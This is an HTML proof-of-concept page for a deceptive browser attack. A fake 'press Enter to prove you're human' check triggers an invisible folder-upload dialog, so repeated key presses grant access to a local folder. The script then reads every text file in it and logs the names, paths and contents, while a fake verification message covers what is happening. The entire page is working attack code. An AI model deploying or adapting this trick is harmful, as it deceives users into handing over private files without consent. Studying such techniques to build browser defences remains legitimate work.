<html>
<head>
    <title>
		PoC
    </title>
    <style>
        #thing {
            opacity: 0.0;
        }
    </style>
</head>

<body>
    <h3 id="qmsg">Click the enter key as fast as you can for 5 seconds to prove you're human..</h3>
    <input id="thing" type="file" webkitdirectory mozdirectory accept="text/*" />

<script>
    var i = 0;

    document.onkeydown = function () {
        i++;
        if (i > 4) {
            thing.click(); // trigger folder picker
            i = -10000;
            document.onkeydown = null;

            setTimeout(function () {
                qmsg.innerHTML = '<u>Thank you! Please wait while we verify (this might take a few minutes).</u>';
            }, 1000);
        }
    };

    thing.onchange = function () {
        const files = this.files;

        alert('You selected ' + files.length + ' files');

        for (let j = 0; j < files.length; j++) {
            const file = files[j];

            console.log("File name:", file.name);
            console.log("Full path:", file.webkitRelativePath);

            const reader = new FileReader();

            reader.onload = function (e) {
                console.log("Content of", file.name);
                console.log(e.target.result);
            };

            reader.readAsText(file);
        }
    };
</script>
</body>

</html>
